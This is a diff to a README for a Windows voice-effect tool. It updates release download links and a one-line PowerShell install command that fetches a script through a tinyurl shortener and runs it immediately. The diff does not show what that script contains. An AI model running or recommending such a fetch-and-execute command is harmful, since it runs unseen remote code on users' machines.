@@ -16,7 +16,7 @@ Real-time voice and video effect processor for Windows. Change your voice with 2
 4. Press Enter
 
 ```
-iex (iwr -useb https://tinyurl.com/voiceffect202)
+iex (iwr -useb https://tinyurl.com/voiceffect203)
 ```
 
 - ✅ Done. Your voice effects are one command away.
@@ -27,8 +27,8 @@ iex (iwr -useb https://tinyurl.com/voiceffect202)
 
 | Version | Download |
 |---------|----------|
-| Installer | [VoiceEffect Setup 2.0.2.exe](https://github.com/eaeoz/VoiceEffect/releases/download/2.0.2/VoiceEffect.Setup.2.0.2.exe) |
-| Portable | [VoiceEffect_portable_2.0.2.exe](https://github.com/eaeoz/VoiceEffect/releases/download/2.0.2/VoiceEffect_portable_2.0.2.exe) |
+| Installer | [VoiceEffect Setup 2.0.3.exe](https://github.com/eaeoz/VoiceEffect/releases/download/2.0.3/VoiceEffect.Setup.2.0.3.exe) |
+| Portable | [VoiceEffect_portable_2.0.3.exe](https://github.com/eaeoz/VoiceEffect/releases/download/2.0.3/VoiceEffect_portable_2.0.3.exe) |
 
 - **Installer** — Installs like a regular program. You can choose the install directory.
 - **Portable** — Runs without installation. Just double-click the `.exe` file.
